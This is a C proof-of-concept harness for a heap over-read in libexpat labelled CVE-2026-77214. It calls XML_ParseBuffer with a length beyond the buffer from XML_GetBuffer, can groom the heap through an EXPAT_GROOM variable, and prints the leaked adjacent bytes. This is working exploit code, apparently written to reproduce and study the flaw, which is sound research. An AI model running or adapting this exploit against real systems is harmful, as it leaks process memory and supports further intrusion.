/* expatparsebuf2shell: direct-sink harness for CVE-2026-77214.
 * Calls the REAL XML_GetBuffer/XML_ParseBuffer from pinned libexpat sources;
 * no parser code is copied or reimplemented.  Usage:
 *   harness CAP LEN [SEED]
 * CAP is the capacity requested from XML_GetBuffer; LEN is the caller-supplied
 * length passed to XML_ParseBuffer (the vulnerable sink advances m_bufferEnd
 * by LEN without validating it against the buffer capacity).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <expat.h>

static unsigned char seen[65536];
static int seen_len;


static void cdata(void *userData, const XML_Char *s, int len) {
    (void)userData;
    for (int i = 0; i < len && seen_len < (int)sizeof(seen); i++)
        seen[seen_len++] = (unsigned char)s[i];
}

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s CAP LEN [SEED]\n", argv[0]);
        return 2;
    }
    int cap = atoi(argv[1]);
    int len = atoi(argv[2]);
    int seed = argc > 3 ? atoi(argv[3]) : 0x41;
    if (cap < 4 || len < cap || len > 65536) {
        fprintf(stderr, "need 4 <= CAP <= LEN <= 65536\n");
        return 2;
    }

    XML_Parser p = XML_ParserCreate(NULL);
    if (!p) { fprintf(stderr, "XML_ParserCreate failed\n"); return 2; }
    XML_SetCharacterDataHandler(p, cdata);

    char *buf = XML_GetBuffer(p, cap);
    if (!buf) { fprintf(stderr, "XML_GetBuffer failed\n"); return 2; }
    int groom = getenv("EXPAT_GROOM") != NULL;
    char *adj = NULL;
    if (groom) {
        adj = (char *)malloc((size_t)cap);
        if (!adj) { fprintf(stderr, "groom malloc failed\n"); return 2; }
        memset(adj, seed & 0xff, (size_t)cap);
    }
    (void)adj; /* kept live for the whole parse */
    if (groom)
        fprintf(stderr, "buf=%p adj=%p delta=%ld\n", (void *)buf, (void *)adj,
                (long)(adj - buf));
    /* Filling all CAP bytes with 'A' makes every byte inside the allocation
       valid XML character data; bytes beyond CAP are read from adjacent heap. */
    memset(buf, 'A', (size_t)cap);
    buf[0] = '<'; buf[1] = 'a'; buf[2] = '>';

    enum XML_Status st = XML_ParseBuffer(p, len, 1);
    fprintf(stderr, "cap=%d len=%d seed=0x%02x groom=%d status=%d error=%d cdata_len=%d\n",
            cap, len, seed & 0xff, groom, (int)st, (int)XML_GetErrorCode(p), seen_len);
    int tail = 0;
    for (int i = seen_len - 1; i >= 0 && seen[i] == (unsigned char)(seed & 0xff); i--)
        tail++;
    fprintf(stderr, "tail_seed_count=%d tail=", tail);
    for (int i = seen_len - 64 < 0 ? 0 : seen_len - 64; i < seen_len; i++)
        fprintf(stderr, "%02x", seen[i]);
    fprintf(stderr, "\n");
    XML_ParserFree(p);
    return 0;
}
